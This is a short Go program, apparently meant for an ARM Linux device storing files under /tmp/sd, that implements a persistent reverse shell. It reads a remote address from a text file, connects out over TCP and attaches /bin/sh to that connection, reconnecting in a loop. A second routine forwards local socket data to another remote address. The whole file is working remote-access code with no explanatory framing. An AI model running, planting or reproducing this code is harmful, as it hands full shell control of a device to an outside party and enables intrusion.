package main

import (
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)
import "net"

// GOOS=linux GOARCH=arm go build -o rev shell.go

func pipeLogs() {
	for {
		addr, err := os.ReadFile("/tmp/sd/logs.txt")
		if err != nil {
			log.Println(err)
			continue
		}

		_ = os.Remove("/tmp/logsock")
		logsSocket, err := net.ListenUnixgram("unixgram", &net.UnixAddr{Name: "/tmp/logsock"})
		if err != nil {
			log.Println(err)
			continue
		}

		outSocket, err := net.DialTimeout("tcp", strings.TrimSpace(string(addr)), 5*time.Second)
		if err != nil {
			continue
		}

		buf := make([]byte, 4096*10)

		for {
			n, _, err := logsSocket.ReadFromUnix(buf)
			if err != nil {
				log.Println(err)
				continue
			}

			_, err = outSocket.Write(buf[:n])
			if err != nil {
				log.Println(err)
				continue
			}
		}
	}
}

func reverseShell() {
	for {
		addr, err := os.ReadFile("/tmp/sd/rev.txt")
		if err != nil {
			log.Println(err)
			continue
		}

		c, err := net.DialTimeout("tcp", strings.TrimSpace(string(addr)), 5*time.Second)
		if err != nil {
			continue
		}

		cmd := exec.Command("/bin/sh")
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c
		_ = cmd.Run()
		_ = cmd.Wait()
	}
}

func main() {
	_ = os.Remove("/tmp/sd/logging.txt")

	for {
		file, err := os.OpenFile("/tmp/sd/logging.txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, 0777)
		if err != nil {
			log.Println(err)
			continue
		}

		log.SetOutput(file)
		break
	}

	go reverseShell()
	go pipeLogs()

	select {}
}
